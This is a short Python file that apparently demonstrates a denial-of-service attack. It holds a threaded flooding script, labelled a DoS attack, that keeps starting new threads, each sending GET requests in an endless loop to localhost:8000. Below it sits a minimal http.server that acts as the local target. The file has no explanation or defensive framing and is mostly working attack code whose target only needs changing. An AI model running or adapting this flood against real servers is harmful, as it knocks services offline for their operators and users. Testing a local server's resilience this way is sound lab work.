import requests
import threading
import time

# Server URL
url = "http://localhost:8000"

# Function to send requests
def send_request():
    while True:
        try:
            response = requests.get(url)
            print(f"Response code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

# Launch multiple threads to simulate DoS
def start_dos(threads, delay):
    while True:
        for _ in range(threads):
            # Create a new thread for each request
            thread = threading.Thread(target=send_request)
            thread.start()
        time.sleep(delay)

# Start DoS attack
start_dos(threads=5, delay=1)


############################# SERVER CODE BELOW (SEP FILE) ##################################

import http.server
import socketserver

PORT = 8000
Handler = http.server.SimpleHTTPRequestHandler

with socketserver.TCPServer(("", PORT), Handler) as httpd:
    print(f"Serving at port {PORT}")
    httpd.serve_forever()
